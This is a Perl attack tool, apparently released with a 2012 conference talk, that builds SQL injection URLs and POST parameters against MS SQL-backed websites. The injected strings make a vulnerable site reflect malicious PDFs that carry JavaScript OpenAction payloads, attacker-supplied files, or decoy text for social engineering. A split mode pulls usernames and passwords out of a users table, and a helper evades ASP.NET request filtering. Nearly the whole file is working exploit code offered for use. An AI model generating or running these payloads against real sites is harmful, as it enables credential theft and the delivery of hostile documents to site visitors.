=pod
=head1 NAME

  SQL_Squirrel: SeQUel InjectoR for REflected Lulz
  sql_squirrel.pl - Generate URLs to use SQLi vulnerabilities to reflect back malicious PDFs
  v1.0.2012.07.24.03.17

  =head1 SYNOPSIS

  perl sql_squirrel.pl --url 'http://some-target.com/targetpage.php?param1=foo&ImageId=!!!&param3=foo' --js alert
  perl sql_squirrel.pl --requestmethod POST  --text 'static text for my pdf!'
  perl sql_squirrel.pl --file exploit.pdf --b64
  perl sql_squirrel.pl --split --textout --select_list "'%2bRTRIM(username)%2b'|'%2bRTRIM(password)%2b'" --source_list 'FROM tblUsers WHERE ID=1'

  =head1 DESCRIPTION

  Script used to exploit reflected PDF attacks using SQLi. See: BSides Las Vegas 2012 "Mirror Mirror - Reflected PDF Attacks Using SQL Injection"

  =head1 AUTHORS

  Script Author: Kristov Widak (kwidak@gmail.com / @krsec)
  Research By: Shawn Asmus (@cybeard), @krsec
  
=cut

#TODO: could probably add option to b64 encode a file not on local system but based on building a js payload...

use Getopt::Long;
use MIME::Base64;

use constant DEFAULT_URL => 'http://target.com/foo?ImageID=!!!';

#Constant prefixes and suffixes to build the various kinds of attacks available. These
# have minimal character encoding, suitable for a POST request. If the user specifies a GET request,
# addition encoding will be performed on these strings later on in the script. I took this approach
# rather than specifying separate constants for GET requests to try to maintain consistency of
# encoding later on. :-)
use constant DEFAULT_ATTACK_PREFIX => "' AND 1=0 UNION ALL SELECT CONVERT(varchar(max),";
use constant DEFAULT_ATTACK_SUFFIX => ")--";
use constant SPLIT_ATTACK_SUFFIX => "--"; #special case for split T-SQL query payload

use constant SCRIPT_GET_PAYLOAD_PREFIX => "'%PDF-1.'%2bCHAR(10)%2b'1+0+obj<<>>endobj trailer" .
									"<< /Root<< /Pages<<>>/OpenAction<< /S/JavaScript/JS(";
use constant SCRIPT_POST_PAYLOAD_PREFIX => "'%PDF-1.'+CHAR(10)+'1 0 obj<<>>endobj trailer" .
									"<< /Root<< /Pages<<>>/OpenAction<< /S/JavaScript/JS(";
use constant SCRIPT_PAYLOAD_SUFFIX => ")>>>>>>'";

use constant TEXT_PAYLOAD_PREFIX => "'%PDF-1.'+CHAR(10)+'1 0 obj<</Type/Catalog/Pages 2 0 R>>" .
									"endobj 2 0 obj<</Type/Pages/MediaBox[ 0 0 400 100 ]/" .
									"Count 1/Kids[ 3 0 R ]>>endobj 3 0 obj<</Type/Page/" .
									"Parent 2 0 R/Resources<</Font<</F1 4 0 R>>>>/Contents" .
									" 5 0 R>>endobj 4 0 obj<</Type/Font/Subtype/Type1/BaseFont/" .
									"Times-Roman>>endobj 5 0 obj<</Length 440>>stream'+CHAR(10)" .
									"+'BT 70 50 TD/F1 12 Tf('+'";
									
use constant TEXT_PAYLOAD_SUFFIX =>	"'+') Tj ET'+CHAR(10)+'endstream'+CHAR(10)+'endobj trailer" .
									"<</Root 1 0 R>>'";

use constant FILE_BASE64_PREFIX => "CAST(N'' AS XML).value('xs:base64Binary(\"";
use constant FILE_BASE64_SUFFIX => "\")','VARBINARY(MAX)')";

use constant FILE_HEX_PREFIX => "CAST(N'' AS XML).value('xs:hexBinary(\"";
use constant FILE_HEX_SUFFUX => "\")','VARBINARY(MAX)')";

use constant SPLIT_GET_JS_PREFIX => "'%PDF-1.'%2bCHAR(10)%2b'1 0 obj<<>>endobj trailer<</Root<<" .
									"/Pages<<>> /OpenAction<</S /JavaScript /JS(app.alert({" .
									"cMsg:''";								
#'%2brtrim(username)%2b'|'%2brtrim(password)%2b'
									
use constant SPLIT_GET_JS_MIDDLE => "''});)>>>>>>') ";
#FROM+tblUsers+WHERE+ID=1

use constant SPLIT_GET_TEXT_PREFIX => "'%PDF-1.'%2bCHAR(10)%2b'1 0 obj<</Type/Catalog/Pages 2 0 R>>" .
									"endobj 2 0 obj<</Type/Pages/MediaBox[ 0 0 400 100 ]/Count 1/Kids" .
									"[ 3 0 R ]>>endobj 3 0 obj<</Type/Page/Parent 2 0 R/Resources<<" .
									"/Font<</F1 4 0 R>>>>/Contents 5 0 R>>endobj 4 0 obj<</Type/Font" .
									"/Subtype/Type1/BaseFont/Times-Roman>>endobj 5 0 obj<</Length 440" .
									">>stream'%2bCHAR(10)%2b'BT 70 50 TD/F1 12 Tf(";
#'%2bRTRIM(username)%2b'|'%2bRTRIM(password)%2b'
use constant SPLIT_GET_TEXT_MIDDLE => ") Tj ET'%2bCHAR(10)%2b'endstream'%2bCHAR(10)%2b'endobj trailer<<" .
									"/Root 1 0 R>>') ";
#FROM+tblUsers+WHERE+ID=1

use constant USAGE => "USAGE:\n" .
			"\n" .
			"perl sql_squirrel.pl [OPTIONS]\n" .
			"\n" .
			"General Options:\n" .
			"----------------\n" .
			"--url [url]\t\t\tSpecify the URL to be used for the attack. You must use the character sequence '!!!'\n" .
				"\t\t\t\t as a placeholder to indicate which GET paramter to place the attack string. If you do\n" .
				"\t\t\t\t not specify this option, a generic URL will be used.\n" .
			"--requestmethod [GET or POST]\tSpecify whether the attack string be submitted as a GET request or as part of a POST\n" .
				"\t\t\t\t request. If this option is not specified, it will default to a GET request and provide an attack URL.\n" .
			"\n" .
			"Local Source PDF File Options:\n" .
			"------------------------------\n" .
			"--file [local_filename]\t\tSpecify a local PDF file to replace the PDF returned by the website.\n" .
			"--b64\t\t\t\tEnable base-64 encoding of the file. \n" .
			"--hex\t\t\t\tEnable hex encoding of the file.\n" .
			"\n" .
			"JavaScript Payload Options:\n" .
			"---------------------------\n" .
			"--js [script]\t\t\tSpecify arbitrary JS payload to be executed when PDF is opened. JS must conform to PDF\n" .
				"\t\t\t\t specifications. See: http://partners.adobe.com/public/developer/en/acrobat/sdk/AcroJSGuide.pdf\n" .
			"--js alert\t\t\tUse simple alert box JS payload to demonstrate JS execution.\n" .
			"\n" .
			"Static Text Payload Options:\n" .
			"----------------------------\n" .
			"--text [text]\t\t\tSpecify some static text that will be visible to the reader of the PDF. Useful for POC and for building up\n" .
				"\t\t\t\t legitimate-looking PDFs for social engineering.\n" .
			"\n" .
			"Split T-SQL Payload Options:\n" .
			"----------------------------\n" .
			"--split\t\t\t\tGenerate a payload that will query the target database for some information and report back the results of the\n" .
				"\t\t\t\t query. Using this option requires that you choose JavaScript or Static Text as a means of returning the query\n" .
				"\t\t\t\t results in the PDF. It also requires you to specify the select_list and source_list options. This payload\n" .
				"\t\t\t\t option is ONLY available for GET requests, currently.\n" .
			"--jsout\t\t\t\tUse alert box to report results of T-SQL query.\n" .
			"--textout\t\t\tUse static text in the PDF to report results of the T-SQL query.\n" .
			"--select_list\t\t\tThe portion of the T-SQL query that specifies which records are being queried.\n" .
				"\t\t\t\t e.g.: '+RTRIM(username)+'|'+RTRIM(password)+'\n" .
			"--source_list\t\t\tThe portion of the T-SQL query following the select_list portion of the query, including the WHERE, GROUP BY,\n" .
				"\t\t\t\t HAVING, and ORDER BY clauses. (See: http://msdn.microsoft.com/en-us/library/ms189499.aspx).\n" .
				"\t\t\t\t e.g.: FROM tblUsers WHERE ID=1\n" .
			"\n";

########################################
# Read in script options from the user #
########################################

my $userSpecifiedURL = '';
my $userSpecifiedInputFile = '';
my $useBase64Encoding = '';
my $useHexEncoding = '';
my $userSpecifiedScript = '';
my $userSpecifiedText = '';
my $userSpecifiedRequestMethod = 'GET';
my $splitMode = '';
my $useJSOut = '';
my $useTextOut = '';
my $userSpecifiedSelectList = '';
my $userSpecifiedSourceList = '';


my $optionResult = GetOptions(
					"url=s" => \$userSpecifiedURL,						#string
					"requestmethod=s" => \$userSpecifiedRequestMethod, 	#string
					"file=s" => \$userSpecifiedInputFile,				#string
					"b64" => \$useBase64Encoding,						#flag
					"hex" => \$useHexEncoding,							#flag
					"js=s" => \$userSpecifiedScript,					#string
					"text=s" => \$userSpecifiedText,					#string
					"split" => \$splitMode,								#flag
					"jsout" => \$useJSOut,								#flag
					"textout" => \$useTextOut,							#flag
					"select_list=s" => \$userSpecifiedSelectList,		#string
					"source_list=s" => \$userSpecifiedSourceList		#string
					);				

#################################################################
# Process any errors the user may have made with script options #
#################################################################

my $optionErrors = '';

if (lc($userSpecifiedRequestMethod) ne lc('GET') and lc($userSpecifiedRequestMethod) ne lc('POST'))
{
	$optionErrors .= "The only valid request methods are GET and POST. Default is GET.\n";
}

#specifies which of the 4 options the user chooses
my $mode = '';

if ($splitMode) #handle split T-SQL query option
{
	$mode = 'split';
	
	if ($userSpecifiedInputFile or $userSpecifiedScript or $userSpecifiedText)
	{
		$optionErrors .= "You can only select a JS payload, a file payload, a static text payload, or a split T-SQL query payload.\n";
	}
	
	if (lc($userSpecifiedRequestMethod) eq lc('POST'))
	{
		$optionErrors .= "This script does not currently support POST requests for Split T-SQL Payloads.\n";
	}
	
	if (($useJSOut and $useTextOut) or (!useJSOut and !useTextOut))
	{
		$optionErrors .= "You must either select JavaScript or Static Text as a method of presenting the T-SQL query results.\n";
	}
	
	unless ($userSpecifiedSelectList)
	{
		$optionErrors .= "You must specify the select_list contents.\n";
	}
	
	unless ($userSpecifiedSourceList)
	{
		$optionErrors .= "You must specify the source_list contents.\n";
	}
}
elsif ($userSpecifiedInputFile) #handle file payload option
{
	$mode = 'file';
	if ($userSpecifiedScript or $userSpecifiedText or $splitMode)
	{
		$optionErrors .= "You can only select a JS payload, a file payload, a static text payload, or a split T-SQL query payload.\n";
	}
	
	unless ($useBase64Encoding or $useHexEncoding)
	{
		$optionErrors .= "When specifying a source PDF file with the -f option, you must " .
						"select either base-64 or hex encoding of the binary with the -b " .
						"or -h options.\n";
	}
	
	unless(-f $userSpecifiedInputFile) #make sure file exists
	{
		$optionErrors .= "Could not read file specified '$userSpecifiedInputFile' from current working directory.\n";
	}
}
elsif($userSpecifiedScript) #handle javascript payload option
{
	$mode = 'js';
	if ($userSpecifiedText or $userSpecifiedInputFile or $splitMode)
	{
		$optionErrors .= "You can only select a JS payload, a file payload, a static text payload, or a split T-SQL query payload.\n";
	}
}
elsif($userSpecifiedText) #handle static text payload option
{
	$mode = 'text';
	if ($userSpecifiedScript or $userSpecifiedInputFile or $splitMode)
	{
		$optionErrors .= "You can only select a JS payload, a file payload, a static text payload, or a split T-SQL query payload.\n";
	}
}

my $url = DEFAULT_URL;

if ($userSpecifiedURL)
{
	$url = $userSpecifiedURL;
	
	unless ($userSpecifiedURL =~ /!!!/)
	{
		$optionErrors .= "URL format specified not recognized. Missing '!!!' placeholder to indicate param to attack.\n";
	}
	
	if (lc($userSpecifiedRequestMethod) eq lc('POST'))
	{
		$optionErrors .= "You specified POST as a request method, so you will be injecting this into a POST parameter and not a URL. Do not specify a URL.\n";
	}
}

unless ($mode)
{
	$optionErrors .= "You must select a JS payload, a file payload, a static text payload, or a split T-SQL query payload.\n";
}

if ($optionErrors)
{
	print "$optionErrors\n";
	die(USAGE);
}

############################################################
# Build the payload based on the specified script options. #
############################################################

my $payload;

if ($mode eq 'js') # User specified javascript payload
{	
	my $javascript = '';
	
	#handle included js presets like alert
	if ($userSpecifiedScript eq 'alert')
	{
		$javascript = "app.alert({cMsg:''Exploited by sql_squirrel''});";
	}
	else #user specified js payload
	{
		#escape single quotes to avoid breaking our attack SQL string
		$javascript = escapeSingleQuotes($userSpecifiedScript);
	}
	if (lc($userSpecifiedRequestMethod) eq lc('GET'))
	{
		#Need to url-encode all "+" symbols in the T-SQL syntax as %2b to avoid confusion with the
		# spaces in the URL encoded as "+" because it's a GET request.
		$payload = SCRIPT_GET_PAYLOAD_PREFIX . $javascript. SCRIPT_PAYLOAD_SUFFIX;
	}
	else
	{
		$payload = SCRIPT_POST_PAYLOAD_PREFIX . $javascript . SCRIPT_PAYLOAD_SUFFIX;
	}
}
elsif($mode eq 'text') # User specified Static Text payload
{
	my $text = $userSpecifiedText;
	
	#Need to escape any single quotes that are in the text so they do not break out of the
	# SQL string.
	$text = escapeSingleQuotes($text);
	
	$payload = TEXT_PAYLOAD_PREFIX . $text . TEXT_PAYLOAD_SUFFIX;
	
	#If a GET request, need to URI escape the "+" symbol so it's not confused with a space
	# in the GET request as opposed to a "+" in the static text or a "+" operator in SQL
	# syntax.
	if (lc($userSpecifiedRequestMethod) eq lc('GET'))
	{
		$payload = uriEncodePlusSign($payload);
	}
}
elsif($mode eq 'file') # User specified input PDF file as payload
{
	#TODO: handle file length issues
	open FILE, $userSpecifiedInputFile or die "Could not open '$userSpecifiedInputFile' for reading.\n";
	binmode FILE;
	my $contents;
	read(FILE, $contents, 65536); #TODO: I guess 65536 is a special number? Unlikely that a user will exceed this...
	close FILE;
	
	if ($useBase64Encoding) #base 64 encode file
	{
		my $b64encoded = encode_base64($contents);
		
		#the b64 character set includes "+", which should not be confused with a space in
		# a GET request. URI encode to avoid this in GET requests.
		if (lc($userSpecifiedRequestMethod) eq lc('GET'))
		{
			$b64encoded = uriEncodePlusSign($b64encoded);
		}
		
		#remove pesky newlines created by encode_base64().
		$b64encoded =~ s/\n//g;
		$payload = FILE_BASE64_PREFIX . $b64encoded . FILE_BASE64_SUFFIX;
	}
	else	#hex encode file
	{
		my $hexEncoded = unpack("H*",$contents);
		$payload = FILE_HEX_PREFIX . $hexEncoded . FILE_HEX_SUFFIX;
	}
}
elsif($mode eq 'split') #User specified split T-SQL query as payload
{
	if (lc($userSpecifiedRequestMethod) eq lc('GET'))
	{
		#URI-encode "+" sign to make sure SQL "+" operator is not confused for a space in
		# the GET request.
		$userSpecifiedSelectList = uriEncodePlusSign($userSpecifiedSelectList);
		$userSpecifiedSourceList = uriEncodePlusSign($userSpecifiedSourceList);
	}
	
	if ($useJSOut) #use a js alert popup to present query results
	{
		$payload = SPLIT_GET_JS_PREFIX . $userSpecifiedSelectList . SPLIT_GET_JS_MIDDLE . $userSpecifiedSourceList;
	}
	else #present query results in static text in the pdf
	{
		$payload = SPLIT_GET_TEXT_PREFIX . $userSpecifiedSelectList . SPLIT_GET_TEXT_MIDDLE . $userSpecifiedSourceList;
	}
}

my $attack_string = '';
if ($splitMode) #attack string has slightly different suffix if payload is split T-SQL query
{
	$attack_string = DEFAULT_ATTACK_PREFIX . $payload . SPLIT_ATTACK_SUFFIX;
}
else
{
	$attack_string = DEFAULT_ATTACK_PREFIX . $payload . DEFAULT_ATTACK_SUFFIX;
}

###################################################################
# Apply any URI-level encodings necessary:                        #
# 1. .Net XSS Filtering Evasion                                   #
# 2. If a GET request, spaces must be replaced with a "+" symbol. #
###################################################################

# .Net XSS Filtering Evasion
$attack_string = evadeDotNetFilter($attack_string);

# GET Encoding of Spaces
if (lc($userSpecifiedRequestMethod) eq lc('GET'))
{
	$attack_string = spaceToPlusEncode($attack_string);
}

# If a GET request, generate URL. Otherwise, just output the text to inject into a POST param.
if (lc($userSpecifiedRequestMethod) eq lc('GET'))
{
	$url =~ s/!!!/$attack_string/;
	print "Generated attack URL for GET request:\n";
	print "$url\n";
}
else
{
	print "Generated attack parameter for POST request:\n";
	print "$attack_string\n";
}

######################
# HELPER SUBROUTINES #
######################

sub uriEncodePlusSign
{
	my $str = shift;
	$str =~ s/\+/%2b/g;
	return $str;
}

#Encodes spaces in GET request as "+" symbol
#param0: string to encode
sub spaceToPlusEncode
{
	my $str = shift;
	$str =~ s/ /\+/g;
	return $str;
}

#TODO: update with info from http://software-security.sans.org/blog/2011/07/22/bypassing-validaterequest-in-asp-net/
sub evadeDotNetFilter
{
	#evade .NET XSS filtering
	my $uri = shift;
	$uri =~ s/<([^<> ])/< $1/g;
	return $uri;
}

sub escapeSingleQuotes
{
	my $str = shift;
	$str =~ s/'/''/g;
	return $str;
}